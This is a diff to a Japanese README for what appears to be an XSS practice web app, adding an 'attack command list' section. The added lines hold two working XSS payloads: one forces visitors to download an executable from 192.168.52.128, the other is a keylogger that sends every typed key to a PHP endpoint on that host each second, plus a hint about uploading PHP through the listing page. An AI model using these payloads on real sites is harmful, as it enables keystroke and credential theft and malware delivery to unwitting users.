@@ -100,6 +100,25 @@ drop table Item_Image;
 UPDATE Item SET is_sold = 0;
 ```
 
+
+## 攻撃コマンド一覧
+
+```html:強制ダウンロード攻撃用コマンド（IPは各自のものに変更してください
+aaa<script>        var link = document.createElement('a');        link.href = 'http://192.168.52.128/xss/sample.exe';        link.download = '';        document.body.appendChild(link);        link.click();    </script>
+
+```
+
+
+
+```html:キーロガー（IPは各自のものに変更してください
+cc</div><script type="text/javascript">var keys='';document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;var obj = document.getElementById("div1");obj.innerText = keys;};window.setInterval(function(){new Image().src = 'http://192.168.52.128/keylogger.php?c='+keys;keys = '';}, 1000);</script><body><div id="div1"></div></body>
+
+```
+:::note info
+phpを出品画面でアップして、
+それぞれのリンク先を強制的にそのphpにすれば何かできるかも...？
+:::
+
 ## ファイル情報ツリー
 .  
 ├── a  
